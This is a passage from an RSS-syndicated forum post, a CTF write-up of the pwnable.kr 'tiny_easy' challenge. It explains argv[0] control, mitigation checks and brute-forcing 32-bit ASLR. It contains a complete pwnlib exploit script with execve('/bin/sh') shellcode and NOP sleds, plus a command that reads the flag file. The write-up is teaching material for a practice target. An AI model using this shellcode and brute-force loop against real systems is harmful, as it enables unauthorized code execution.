    printf("\nthis is our argv[0] %s\n", argv[0]);

}

</code></pre>
<p>We compile and run it and get the following result:</p>
<p><strong><img src="/uploads/default/original/2X/d/da97410ec0a3167b099e893ad1a6910965f3fe75.png" alt="" data-base62-sha1="vbK9eUlJr2ajvFwUYMWQr5aBI4R" width="434" height="87"></strong></p>
<p>Let’s use pwnlib to manipulate the argv[0] to our own string</p>
<pre><code class="lang-auto">
from pwnlib.tubes.process import * 

argv_program=process(argv=["awdawd"], executable="/home/user/test_argv")

print argv_program.recv()

</code></pre>
<p>Now lets run our python program and see what result we received from the test_argv program:</p>
<p><strong><img src="/uploads/default/original/2X/2/2c8474e29da91c1ad841a3bfa87a9e819ba3b884.png" alt="" data-base62-sha1="6lONkmt7V095qYoPkcF76WCikQc" width="391" height="67"></strong></p>
<p>Great!</p>
<p>We now know how to have control over argv0, this means we can jump anywhere we want in the tiny_easy binary.</p>
<p>Our next step is checking what mitigations does this binary have.</p>
<p>Let’s run <a href="https://github.com/slimm609/checksec.sh" rel="noopener nofollow ugc">checksec</a> and see.</p>
<p><strong><img src="/uploads/default/original/2X/a/a8a74cd88de9588f8a594cc0b297d145165f0182.png" alt="" data-base62-sha1="o3YEy2tbw1i52WlZyUVWSqrGfM6" width="590" height="131"></strong></p>
<p><strong>RELRO</strong>: No RELRO - no RELRO protection here  - Not relevant</p>
<p><strong>Stack</strong>: No stack canary is found here. Not relevant here but cool</p>
<p><strong>NX:</strong> NX disabled -  non executable protections is disabled, jackpot!</p>
<p>**PIE: **the code is not position independent - not relevant</p>
<p><strong>Note</strong>: By default, ASLR is enabled at stack level</p>
<p>NX protection is a protection which doesn’t allow us to run code only in the code sections of a binary. This means that we can’t jump to code on the stack or heap and run them.</p>
<p>In this example, we can see this binary is compiled without this protection which means we can possibly jump to our code on the stack.</p>
<p>I need to stress this out: <strong>checking for these kinds of protections straight in the beginning will save you a lot of time and frustration.</strong></p>
<p>In this example, because we can’t control the return address and NX is disabled then our best bet is to concentrate our effort of finding a way to jump to the stack and execute our shellcode that is stored in one of our parameters.</p>
<p>If on the other hand, NX was enabled then this means that we couldn’t jump to the stack and we needed to find a different way to run our code (ROP Gadgets, ret2libc, and many other methods)</p>
<p>Now that we can control where we can jump,we need to deal with the fact that ASLR is enabled at the stack level.</p>
<p>Let’s try to find an instruction that can allow us to jmp to the stack and thus run our shellcode.</p>
<p>The rest of the bytes in the program are part of the elf header</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc.png" data-download-href="/uploads/short-url/iHNk5STkr9zeVCzOsL1ZAEFkDZa.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc_2_602x432.png" alt="" data-base62-sha1="iHNk5STkr9zeVCzOsL1ZAEFkDZa" width="602" height="432" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc_2_602x432.png, /uploads/default/original/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc.png 1.5x, /uploads/default/original/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc_2_10x10.png"></a></strong></div><p></p>
<p>We can also view these bytes an instructions in IDA using the “C” hotkey</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4.png" data-download-href="/uploads/short-url/8UcuIBPkv8V5LeJDAKS3KGnu3vm.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4_2_602x427.png" alt="" data-base62-sha1="8UcuIBPkv8V5LeJDAKS3KGnu3vm" width="602" height="427" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4_2_602x427.png, /uploads/default/original/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4.png 1.5x, /uploads/default/original/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4_2_10x10.png"></a></strong></div><p></p>
<p>Our best bet for an instruction to jump to is “jmp esp”</p>
<p>This will jump to the stack and from there we may be able to get to our shellcode that is stored in one of the parameters.</p>
<p>I like to perform my searches by hand <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> so i used <a href="https://defuse.ca/online-x86-assembler.htm" rel="noopener nofollow ugc">online disassembling</a> to find what opcodes make up the jmp esp instruction.</p>
<p>If we try to disassemble jmp esp we get:</p>
<p>ff e3</p>
<p>Lets try to search this bytes in IDA using the search-&gt;sequence of bytes</p>
<p>And put in ff e3</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40.png" data-download-href="/uploads/short-url/hGsHQhN0xpyGKFHNXT62ZTI9SiQ.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40_2_602x145.png" alt="" data-base62-sha1="hGsHQhN0xpyGKFHNXT62ZTI9SiQ" width="602" height="145" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40_2_602x145.png, /uploads/default/original/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40.png 1.5x, /uploads/default/original/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40_2_10x10.png"></a></strong></div><p></p>
<p>No result <img src="https://0x00sec.org/images/emoji/twitter/frowning.png?v=9" title=":frowning:" class="emoji" alt=":frowning:"></p>
<p>I tried searching for the bytes for call esp and didn’t find anything!</p>
<p>Now this is an interesting situation.</p>
<p>We want to jump to our code on the stack but we don’t know the address to jump to because of ASLR.</p>
<p>We tried to find an instruction that allows us to jmp to the stack without knowing it’s address but we didn’t find any.</p>
<p><strong>Another quick idea i tried:</strong></p>
<p>Jmp to an instruction that will allow you to write bytes to code section.</p>
<p>You can use this method to overwrite one of the instructions with the jmp esp opcodes to one of the addresses and then perform a jump to the instruction’s address.</p>
<p>It’s basically like driving a train that builds its tracks while it’s going and i liked the idea of this.</p>
<p>Unfortunately, i checked out the segment permissions to see what are the section permission using view-&gt;Open subviews-&gt;segments and found our the following</p>
<p><strong><img src="/uploads/default/original/2X/a/a86b067c22b1d8012685085d700560d06bed8fea.png" alt="" data-base62-sha1="o1TvYxTYUqcHwrekUpt58tP20ga" width="506" height="45"></strong></p>
<p>Only the R and X permissions are enabled for the code section</p>
<p>R - read permissions</p>
<p>X - execute permissions</p>
<p>The W (write) permission is disabled.</p>
<p>This means that if we attempt to rewrite an instruction in the code section, we will receive a segfault and the program will crash.</p>
<p>I banged my head on this program for a couple of hours, trying different methods of jumping to instructions but i couldn’t find a way to get to the stack successfully.</p>
<p>What shall a young exploiter do next?</p>
<h2>ASLR in 32-bit</h2>
<p>I started reading about ASLR implementation on 32bit systems (remember, our binary is 32-bit )</p>
<p>And i found the following explanation:</p>
<p>“For 32-bit, there are 2^32 (4 294 967 296) theoretical addresses, nevertheless, the kernel will allow to control about only half of bits (2^(32/2) = 65 536) for an execution in a virtualized memory”.</p>
<p>This means that the stack size can randomized just up to 65,536 bytes.</p>
<p>If we can can control tens of thousands of shellcode bytes then we might can try to jmp to a constant address on the stack and have a good probability of success</p>
<p>I checked whether it was possible to send lots of parameters with long strings</p>
<pre><code class="lang-auto">
from pwnlib.tubes.process import *

for i in range(600):


    argv.append("a"*1024)

argv_program=process(argv=["awdawd"], executable="/home/user/test_argv")

print argv_program.recv()

</code></pre>
<p><strong><img src="/uploads/default/original/2X/2/22a128d23236a26d19c88a5f4610a20f0462c6c3.png" alt="" data-base62-sha1="4Wlw1zZoYEmcSc7Nalkrqk4sVJp" width="384" height="75"></strong></p>
<p>We sent in this example, 6014400 bytes to our program and run succesfully</p>
<p>Let’s make a slide!</p>
<p>A NOP slide !</p>
<p><strong><img src="/uploads/default/original/2X/e/e6f58b5d79ff8ac4a567058cb634b591c23aafc1.png" alt="" data-base62-sha1="wX9Tt0Bhnbz1bvRzt4cxwKDzQsh" width="404" height="358"></strong></p>
<p>We can send our parameters filled with nops and our shellcode at the end.</p>
<p>That way, we can jump to a random address on the stack and hopefully we will be able to land on one of our nop instructions and we will slide the whole way to our shellcode.</p>
<p>I made the following code that executes the program</p>
<p>With our payload and attempts to jump to a constant address on the stack</p>
<p>0xffb05544</p>
<p>This address was chosen for both reasons:</p>
<p>1.In this program i noticed after many executions with gdb that this address is most of the time in the range of the stack or very close to it</p>
<p>2.we needed an address without any null bytes in it because otherwise we would get</p>
<p>An the following error:</p>
<p>“Inappropriate nulls in argv[0]:”</p>
<p>So i wrote the following code:</p>
<pre><code class="lang-auto">
import struct

import random

from pwnlib.tubes.process import *

from pwnlib.exception import *

import pwnlib

# Taken from http://shell-storm.org/shellcode/files/shellcode-811.php

# execve('/bin/sh')

EXECV = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

def build_shellcode(address):


    """


    Build shellcode


    address - address to jump to


    """ 


    args = []


    args.append(address)


    shellcode =   "\x90"*8000 + EXECV


    for i in range(120):


        args.append(shellcode)


    return args


     

if __name__ == "__main__":


    jump_address = struct.pack("I", 0xffb05544)


    for i in range(10000000):


        try:


            prog_args = build_shellcode(jump_address)


            	print "attempt number: {}".format(i + 1 )


            pro = process(argv=prog_args,


                env={}, 


                executable="/home/user/CTFs/Pwnables/tiny_easy/tiny_easy")


            print "started_running address {}".format(hex(struct.unpack("I",jump_address)[0]))


            pro.timeout=0.08


            # Send command shell of the process


            pro.sendline("echo we_made_it!")


            # Recv the result of the command execution  


            data = pro.recvline()


            if data:


                print "received data!"


                print data


                break


        except (EOFError, pwnlib.exception.PwnlibException) as e:


            print e

</code></pre>
<p>This code attempts to run the tiny_easy binary and jump to our shellcode which opens a shell. If we succeed then we will be able to send the command</p>
<p>“echo we_made_it” and see it’s output</p>
<p>Lets try it out</p>
<p><strong><img src="/uploads/default/original/2X/d/dc9b1caaab4aa0f2117f8865a88a825cd17096f6.png" alt="" data-base62-sha1="vtzmTTY7FVvmiioDyW7Abcy2buS" width="486" height="215"></strong></p>
<p><strong><img src="/uploads/default/original/2X/d/dc9b1caaab4aa0f2117f8865a88a825cd17096f6.png" alt="" data-base62-sha1="vtzmTTY7FVvmiioDyW7Abcy2buS" width="486" height="215"></strong></p>
<p>It worked!</p>
<p>It seems that our nop slide did it’s job successfully, now let’s check it out on the CTF server itself.</p>
<p>Notice that we need to change the command we wish to execute from</p>
<p>“echo we_made_it” to “cat /home/tiny_easy/flag” In order to get the flag.</p>
<p>We can upload our script to the server’s tmp directory easily using the “scp” command like this:</p>
<pre><code class="lang-auto">
scp -P 2222 ./pwn_tiny.py tiny_easy@pwnable.kr:/tmp/pwn_tiny.py

</code></pre>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485.png" data-download-href="/uploads/short-url/ukXhf8Iewj9bcpFdw0ZeifpxzZb.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485_2_372x499.png" alt="" data-base62-sha1="ukXhf8Iewj9bcpFdw0ZeifpxzZb" width="372" height="499" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485_2_372x499.png, /uploads/default/original/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485.png 1.5x, /uploads/default/original/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485_2_10x10.png"></a></strong></div><p></p>
<p>And there is our flag <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<hr>
<h1>Conclusions</h1>
<p>In this article, we discussed exploit development by using a CTF example,<br>
we learned about how inputs are received by the program from argv and argc.<br>
Finally, saw how ASLR in 32-bit systems is vulnerable due to small randomization ranges and how to utilize this flaw to perform an attack that is statistically very plausible.</p>
<p>I hope you all enjoyed my first post and i’ll see you all next time!</p>
<p><strong>Sources</strong></p>
<p><strong><a href="https://hacked0x90.wordpress.com/2016/10/30/bypassing-aslr-protection-using-brute-force/" rel="noopener nofollow ugc">Bypassing ASLR Protection using Brute Force</a></strong></p>
<p><strong><a href="https://pwnable.kr/" rel="noopener nofollow ugc">Pwnable.kr</a></strong></p>
          <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/1</link>
        <pubDate>Wed, 08 Apr 2020 13:01:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20349-1</guid>
        <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
      </item>
  </channel>
</rss>
